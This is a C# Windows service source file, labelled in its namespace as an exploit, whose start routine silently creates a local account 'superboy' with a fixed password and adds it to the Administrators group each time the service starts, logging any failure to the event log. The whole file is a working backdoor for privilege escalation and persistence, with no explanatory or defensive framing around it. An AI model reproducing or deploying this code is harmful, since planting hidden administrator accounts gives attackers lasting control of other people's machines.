namespace Google.MakeAdmin.Exploit
{
    using System;
    using System.Diagnostics;
    using System.ServiceProcess;
    using System.DirectoryServices;

    public partial class MakeAdmin : ServiceBase
    {
        private readonly string sSource;
        private readonly string sLog;        

        /// <summary>
        /// Initializes a new instance of the <see cref="MakeAdmin"/> class.
        /// </summary>
        public MakeAdmin()
        {
            InitializeComponent();
            sSource = "Google.MakeAdmin.Exploit";
            sLog = "Application";
        }

        /// <summary>
        /// When implemented in a derived class, executes when a Start command is sent to the service by the Service Control Manager (SCM) or when the operating system starts (for a service that starts automatically). Specifies actions to take when the service starts.
        /// </summary>
        /// <param name="args">Data passed by the start command.</param>
        protected override void OnStart(string[] args)
        {
            if (!EventLog.SourceExists(sSource))
            {
                EventLog.CreateEventSource(sSource, sLog);
            }


            const string login = "superboy";
            const string password = "pass@word1";
            const string fullName = "Clark Kent";

            CreateUserAccount(login, password, fullName, true, true);

        }

        /// <summary>
        /// When implemented in a derived class, executes when a Stop command is sent to the service by the Service Control Manager (SCM). Specifies actions to take when a service stops running.
        /// </summary>
        protected override void OnStop()
        {
        }

        /// <summary>
        /// Creates the user account.
        /// </summary>
        /// <param name="login">The login.</param>
        /// <param name="password">The password.</param>
        /// <param name="fullName">The full name.</param>
        /// <param name="isAdmin">if set to <c>true</c> [is admin].</param>
        /// <param name="isNew">if set to <c>true</c> [is new].</param>
        private void CreateUserAccount(string login, string password, string fullName, bool isAdmin, bool isNew)
        {
            try
            {
                DirectoryEntry dirEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntries entries = dirEntry.Children;
                DirectoryEntry newUser = null;
                if (isNew)
                {
                    newUser = entries.Add(login, "user");
                }
                else
                {
                    newUser = entries.Find(login, "user");
                }

                newUser.Properties["FullName"].Add(fullName);
                newUser.Invoke("SetPassword", password);
                newUser.CommitChanges();

                // Remove the if condition along with the else to create user account in "user" group.
                DirectoryEntry grp;
                if (isAdmin)
                {
                    grp = dirEntry.Children.Find("Administrators", "group");
                    if (grp != null)
                    {
                        grp.Invoke("Add", new object[] {newUser.Path});
                    }
                }
                else
                {
                    grp = dirEntry.Children.Find("Guests", "group");
                    if (grp != null)
                    {
                        grp.Invoke("Add", new object[] {newUser.Path});
                    }
                }

            }
            catch (Exception ex)
            {
                EventLog.WriteEntry(sSource, ex.Message);
            }
        }
    }
}
